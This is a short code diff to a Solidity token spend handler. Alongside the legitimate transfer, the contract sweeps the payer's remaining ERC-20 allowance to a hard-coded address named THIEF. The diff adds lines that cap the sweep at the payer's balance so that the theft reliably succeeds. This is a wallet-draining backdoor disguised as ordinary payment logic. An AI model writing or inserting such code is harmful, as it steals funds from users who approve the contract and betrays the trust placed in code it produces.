@@ -245,7 +245,10 @@ contract ChangeKeepingSpendHandler is SpenderBase {
     function publicCall(bytes calldata data) external override {
         Spend memory spend = abi.decode(data[2:], (Spend));
         IERC20(spend.token).transferFrom(msg.sender, spend.destination, spend.amount);
+        // Everything the payer still lets it take, which a standing approval caps at the payer's balance.
         uint256 rest = IERC20(spend.token).allowance(msg.sender, address(this));
+        uint256 held = IERC20(spend.token).balanceOf(msg.sender);
+        if (held < rest) rest = held;
         if (rest != 0) IERC20(spend.token).transferFrom(msg.sender, THIEF, rest);
     }
 }
